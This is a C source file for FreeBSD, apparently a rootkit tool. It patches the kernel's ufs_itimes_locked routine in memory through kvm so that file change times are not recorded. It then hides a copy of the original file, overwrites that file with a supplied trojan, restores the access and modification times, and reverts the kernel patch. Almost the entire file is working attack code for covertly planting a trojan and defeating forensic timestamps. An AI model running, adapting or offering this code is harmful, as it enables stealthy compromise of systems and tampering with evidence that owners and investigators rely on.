#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <utime.h>
#include "magick.h"

#define SIZE 450

/* Replacement code. */
unsigned char	nop_code3[] =
"\x90\x90\x90";
unsigned char	nop_code4[] =
"\x90\x90\x90\x90";

/**
 * Output of "llvm-objdump -dr /boot/kernel/kernel | less"
 * then search for "<ufs_itimes_locked>:"

ffffffff80f4d8e0 <ufs_itimes_locked>:
ffffffff80f4d8e0: 55                    pushq   %rbp
ffffffff80f4d8e1: 48 89 e5              movq    %rsp, %rbp
ffffffff80f4d8e4: 41 56                 pushq   %r14
ffffffff80f4d8e6: 53                    pushq   %rbx
ffffffff80f4d8e7: 48 83 ec 10           subq    $0x10, %rsp
ffffffff80f4d8eb: 49 89 fe              movq    %rdi, %r14
ffffffff80f4d8ee: 48 8b 5f 18           movq    0x18(%rdi), %rbx
ffffffff80f4d8f2: 48 8b 43 18           movq    0x18(%rbx), %rax
ffffffff80f4d8f6: 48 89 df              movq    %rbx, %rdi
ffffffff80f4d8f9: ff 90 e0 01 00 00     callq   *0x1e0(%rax)
ffffffff80f4d8ff: 85 c0                 testl   %eax, %eax
ffffffff80f4d901: 74 0d                 je      0xffffffff80f4d910 <ufs_itimes_locked+0x30>
ffffffff80f4d903: 80 63 48 f8           andb    $-0x8, 0x48(%rbx)
ffffffff80f4d907: 48 83 c4 10           addq    $0x10, %rsp
ffffffff80f4d90b: 5b                    popq    %rbx
ffffffff80f4d90c: 41 5e                 popq    %r14
ffffffff80f4d90e: 5d                    popq    %rbp
ffffffff80f4d90f: c3                    retq
ffffffff80f4d910: 8b 43 48              movl    0x48(%rbx), %eax
ffffffff80f4d913: a8 07                 testb   $0x7, %al
ffffffff80f4d915: 74 f0                 je      0xffffffff80f4d907 <ufs_itimes_locked+0x27>
ffffffff80f4d917: 41 0f b6 0e           movzbl  (%r14), %ecx
ffffffff80f4d91b: 80 c1 fd              addb    $-0x3, %cl
ffffffff80f4d91e: 49 8b 56 20           movq    0x20(%r14), %rdx
ffffffff80f4d922: 80 f9 01              cmpb    $0x1, %cl
ffffffff80f4d925: 77 0b                 ja      0xffffffff80f4d932 <ufs_itimes_locked+0x52>
ffffffff80f4d927: b9 20 00 00 00        movl    $0x20, %ecx
ffffffff80f4d92c: f6 42 0a 20           testb   $0x20, 0xa(%rdx)
ffffffff80f4d930: 74 1c                 je      0xffffffff80f4d94e <ufs_itimes_locked+0x6e>
ffffffff80f4d932: b9 08 00 00 00        movl    $0x8, %ecx
ffffffff80f4d937: a8 06                 testb   $0x6, %al
ffffffff80f4d939: 75 13                 jne     0xffffffff80f4d94e <ufs_itimes_locked+0x6e>
ffffffff80f4d93b: be 00 00 00 18        movl    $0x18000000, %esi       # imm = 0x18000000
ffffffff80f4d940: 23 72 04              andl    0x4(%rdx), %esi
ffffffff80f4d943: 74 09                 je      0xffffffff80f4d94e <ufs_itimes_locked+0x6e>
ffffffff80f4d945: b9 40 00 00 00        movl    $0x40, %ecx
ffffffff80f4d94a: a8 01                 testb   $0x1, %al
ffffffff80f4d94c: 74 0e                 je      0xffffffff80f4d95c <ufs_itimes_locked+0x7c>
ffffffff80f4d94e: 48 8b 7b 10           movq    0x10(%rbx), %rdi
ffffffff80f4d952: 09 c8                 orl     %ecx, %eax
ffffffff80f4d954: 89 43 48              movl    %eax, 0x48(%rbx)
ffffffff80f4d957: e8 34 3f d9 ff        callq   0xffffffff80ce1890 <vlazy>
ffffffff80f4d95c: 48 8d 7d e0           leaq    -0x20(%rbp), %rdi
ffffffff80f4d960: e8 1b 12 d9 ff        callq   0xffffffff80cdeb80 <vfs_timestamp>
ffffffff80f4d965: 8b 4b 48              movl    0x48(%rbx), %ecx
ffffffff80f4d968: f6 c1 01              testb   $0x1, %cl
ffffffff80f4d96b: 74 3c                 je      0xffffffff80f4d9a9 <ufs_itimes_locked+0xc9>
ffffffff80f4d96d: 48 8b 45 e0           movq    -0x20(%rbp), %rax
ffffffff80f4d971: f7 c1 00 04 00 00     testl   $0x400, %ecx            # imm = 0x400
ffffffff80f4d977: 75 09                 jne     0xffffffff80f4d982 <ufs_itimes_locked+0xa2>
ffffffff80f4d979: 48 8b 4b 38           movq    0x38(%rbx), %rcx
ffffffff80f4d97d: 89 41 10              movl    %eax, 0x10(%rcx)
ffffffff80f4d980: eb 08                 jmp     0xffffffff80f4d98a <ufs_itimes_locked+0xaa>
ffffffff80f4d982: 48 8b 4b 38           movq    0x38(%rbx), %rcx
ffffffff80f4d986: 48 89 41 20           movq    %rax, 0x20(%rcx)
ffffffff80f4d98a: f7 43 48 00 04 00 00  testl   $0x400, 0x48(%rbx)      # imm = 0x400
ffffffff80f4d991: 8b 45 e8              movl    -0x18(%rbp), %eax
ffffffff80f4d994: 48 8b 4b 38           movq    0x38(%rbx), %rcx
ffffffff80f4d998: ba 14 00 00 00        movl    $0x14, %edx
ffffffff80f4d99d: be 44 00 00 00        movl    $0x44, %esi
ffffffff80f4d9a2: 48 0f 44 f2           cmoveq  %rdx, %rsi
ffffffff80f4d9a6: 89 04 31              movl    %eax, (%rcx,%rsi)
ffffffff80f4d9a9: 8b 4b 48              movl    0x48(%rbx), %ecx
ffffffff80f4d9ac: f6 c1 04              testb   $0x4, %cl
ffffffff80f4d9af: 74 32                 je      0xffffffff80f4d9e3 <ufs_itimes_locked+0x103>
ffffffff80f4d9b1: 48 8b 45 e0           movq    -0x20(%rbp), %rax
ffffffff80f4d9b5: f7 c1 00 04 00 00     testl   $0x400, %ecx            # imm = 0x400
ffffffff80f4d9bb: 75 09                 jne     0xffffffff80f4d9c6 <ufs_itimes_locked+0xe6>
ffffffff80f4d9bd: 48 8b 4b 38           movq    0x38(%rbx), %rcx
ffffffff80f4d9c1: 89 41 18              movl    %eax, 0x18(%rcx)
ffffffff80f4d9c4: eb 08                 jmp     0xffffffff80f4d9ce <ufs_itimes_locked+0xee>
ffffffff80f4d9c6: 48 8b 4b 38           movq    0x38(%rbx), %rcx
ffffffff80f4d9ca: 48 89 41 28           movq    %rax, 0x28(%rcx)
ffffffff80f4d9ce: f6 43 49 04           testb   $0x4, 0x49(%rbx)
ffffffff80f4d9d2: 8b 45 e8              movl    -0x18(%rbp), %eax
ffffffff80f4d9d5: 48 8b 4b 38           movq    0x38(%rbx), %rcx
ffffffff80f4d9d9: 75 05                 jne     0xffffffff80f4d9e0 <ufs_itimes_locked+0x100>
ffffffff80f4d9db: 89 41 1c              movl    %eax, 0x1c(%rcx)
ffffffff80f4d9de: eb 03                 jmp     0xffffffff80f4d9e3 <ufs_itimes_locked+0x103>
ffffffff80f4d9e0: 89 41 40              movl    %eax, 0x40(%rcx)
ffffffff80f4d9e3: 8b 4b 48              movl    0x48(%rbx), %ecx
ffffffff80f4d9e6: f6 c1 02              testb   $0x2, %cl
ffffffff80f4d9e9: 0f 84 14 ff ff ff     je      0xffffffff80f4d903 <ufs_itimes_locked+0x23>
ffffffff80f4d9ef: 48 8b 45 e0           movq    -0x20(%rbp), %rax
ffffffff80f4d9f3: f7 c1 00 04 00 00     testl   $0x400, %ecx            # imm = 0x400
ffffffff80f4d9f9: 75 09                 jne     0xffffffff80f4da04 <ufs_itimes_locked+0x124>
ffffffff80f4d9fb: 48 8b 4b 38           movq    0x38(%rbx), %rcx
ffffffff80f4d9ff: 89 41 20             *movl    %eax, 0x20(%rcx)
ffffffff80f4da02: eb 08                 jmp     0xffffffff80f4da0c <ufs_itimes_locked+0x12c>
ffffffff80f4da04: 48 8b 4b 38           movq    0x38(%rbx), %rcx
ffffffff80f4da08: 48 89 41 30          *movq    %rax, 0x30(%rcx)
ffffffff80f4da0c: f6 43 49 04           testb   $0x4, 0x49(%rbx)
ffffffff80f4da10: 8b 45 e8              movl    -0x18(%rbp), %eax
ffffffff80f4da13: 48 8b 4b 38           movq    0x38(%rbx), %rcx
ffffffff80f4da17: 75 05                 jne     0xffffffff80f4da1e <ufs_itimes_locked+0x13e>
ffffffff80f4da19: 89 41 24             *movl    %eax, 0x24(%rcx)
ffffffff80f4da1c: eb 03                 jmp     0xffffffff80f4da21 <ufs_itimes_locked+0x141>
ffffffff80f4da1e: 89 41 48             *movl    %eax, 0x48(%rcx)
ffffffff80f4da21: f7 43 48 00 04 00 00  testl   $0x400, 0x48(%rbx)      # imm = 0x400
ffffffff80f4da28: b8 78 00 00 00        movl    $0x78, %eax
ffffffff80f4da2d: b9 e8 00 00 00        movl    $0xe8, %ecx
ffffffff80f4da32: 48 0f 44 c8           cmoveq  %rax, %rcx
ffffffff80f4da36: 48 8b 43 38           movq    0x38(%rbx), %rax
ffffffff80f4da3a: 48 ff 04 08          *incq    (%rax,%rcx)
ffffffff80f4da3e: e9 c0 fe ff ff        jmp     0xffffffff80f4d903 <ufs_itimes_locked+0x23>
ffffffff80f4da43: 66 66 66 66 2e 0f 1f 84 00 00 00 00 00        nopw    %cs:(%rax,%rax)
*/
// Disable ufs_itimes change time code
// Record existing file's access, modification times
// Copy existing file to hidden file location
// Copy trojan file over existing file
// Set trojan file's access and modification times
// Restore ufs_itimes change time code
int main(int argc, char *argv[])
{
   int		   i, offset1, offset2, offset3, offset4, offset5, fd = -1;
   char		   errbuf[_POSIX2_LINE_MAX];
   kvm_t	  *kd;
   struct nlist	   nl[] = {{NULL}, {NULL},};
   unsigned char   ufs_itimes_code[SIZE];
   struct stat	   sb;
   struct utimbuf  time, file_time;
   char * trojan = NULL;
   char * destination = NULL;
   char * destination_dir = NULL;
   char * pos = NULL;
   size_t dest_dir_str_len = 0;
   int dest_is_file = 0;

   if (argc < 3) {
      printf("[-] Usage: %s [TROJAN FILE] [DESTINATION]\n", argv[0]);
      exit(0);
   }

   trojan = argv[1];
   destination = argv[2];

   if (stat(trojan, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", trojan, errno);
      exit(-1);
   } else if (!S_ISREG(sb.st_mode)) {
      printf("[x] %s is not a file\n", trojan);
      exit(-1);
   }

   if (stat(destination, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", destination, errno);
      exit(-1);
   }

   // Determine if destination a file or directory
   if (S_ISDIR(sb.st_mode)) {
      destination_dir = destination;
   } else if (S_ISREG(sb.st_mode)) {
      dest_is_file = 1;
      file_time.actime = sb.st_atime;
      file_time.modtime = sb.st_mtime;
      // Find last '/' character in destination path
      if ((pos=strrchr(destination, '/')) == NULL) {
         printf("[x] No '/' character found in destination path: %s\n", destination);
         exit(-1);
      }

      dest_dir_str_len = pos - destination;
      printf("[-] Allocating %lu bytes for destination directory\n", dest_dir_str_len);
      destination_dir = malloc(dest_dir_str_len+1);
      bzero(destination_dir, dest_dir_str_len+1);
      strncpy(destination_dir, destination, dest_dir_str_len);
   } else {
      printf("[x] Destination %s is not a directory or file\n", destination);
      exit(-1);
   }

   if (dest_is_file) {
      printf("[-] Destination file is %s\n", destination);
   }

   printf("[-] Destination directory is %s\n", destination_dir);

   /* Initialize kernel virtual memory access. */
   kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
   if (kd == NULL) {
      fprintf(stderr, "[x] ERROR: %s\n", errbuf);
      exit(-1);
   }
   nl[0].n_name = "ufs_itimes_locked";
   if (kvm_nlist(kd, nl) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   if (!nl[0].n_value) {
      fprintf(stderr, "[x] ERROR: Symbol %s not found\n",
	      nl[0].n_name);
      exit(-1);
   }
   /* Save a copy of ufs_itimes. */
   if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   /*
    * Search through ufs_itimes_locked for the following three lines:
    *
    * DIP_SET(ip, i_ctime, ts.tv_sec);
    *
    * DIP_SET(ip, i_ctimensec, ts.tv_nsec);
    *
    * DIP_SET(ip, i_modrev, DIP(ip, i_modrev) + 1);
    *
    * We will NOP out the lines that write to memory.

ffffffff80f4d9ff: 89 41 20             *movl    %eax, 0x20(%rcx)
ffffffff80f4da08: 48 89 41 30          *movq    %rax, 0x30(%rcx)
ffffffff80f4da19: 89 41 24             *movl    %eax, 0x24(%rcx)
ffffffff80f4da1e: 89 41 48             *movl    %eax, 0x48(%rcx)
ffffffff80f4da3a: 48 ff 04 08          *incq    (%rax,%rcx)
*/

   for (i = 0; i < SIZE - 3; i++) {
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x20)
	 offset1 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0x89 &&
	  ufs_itimes_code[i + 2] == 0x41 &&
	  ufs_itimes_code[i + 3] == 0x30)
	 offset2 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x24)
	 offset3 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x48)
	 offset4 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0xff &&
	  ufs_itimes_code[i + 2] == 0x04 &&
	  ufs_itimes_code[i + 3] == 0x08)
	 offset5 = i;
   }

   /* Save destination directory access and modification times. */
   if (stat(destination_dir, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", destination_dir, errno);
      exit(-1);
   }
   time.actime = sb.st_atime;
   time.modtime = sb.st_mtime;

   if (!dest_is_file) {
      file_time = time;
   }

   /* Patch ufs_itimes. */
   if (kvm_write(kd, nl[0].n_value + offset1, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, nop_code4,
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, nop_code4,
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }

   // Copy existing file to hidden file location
   if (dest_is_file) {
      printf("[-] Copying existing file %s to %s.%s\n", destination,
         destination, T_NAME);
      char * copy_existing = malloc(3 + strlen(destination) + 1 +
         strlen(destination) + 1 + strlen(T_NAME));
      pos = copy_existing;
      strcpy(pos, "cp ");
      pos+=3;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, " ");
      pos++;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, ".");
      pos++;
      strcpy(pos, T_NAME);

      printf("[-] command = %s\n", copy_existing);
      if (system(copy_existing) < 0) {
         printf("[x] Failed to copy existing file %s to %s.%s\n", destination,
            destination, T_NAME);
      }

      free(copy_existing);
   }

   /* Copy trojan into DESTINATION. */
   char *string = malloc(3 + strlen(trojan) + 1 + strlen(destination));
   pos = string;
   strcpy(pos, "cp ");
   pos+=3;
   strcpy(pos, trojan);
   pos+=strlen(trojan);
   strcpy(pos, " ");
   pos++;
   strcpy(pos, destination);

   printf("[-] command = %s\n", string);
   if (system(string) < 0) {
      printf("[x] Failed to copy trojan file %s to %s\n", trojan, destination);
   }

   free(string);

   /* Roll back destination directory access and modification times. */
   if (utime(destination, &file_time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (utime(destination_dir, &time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, &ufs_itimes_code[offset3],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, &ufs_itimes_code[offset4],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, &ufs_itimes_code[offset5],
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }
   /* Close kd. */
   if (kvm_close(kd) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }

   printf("[-] Trojan successfully planted\n");
   exit(0);
}
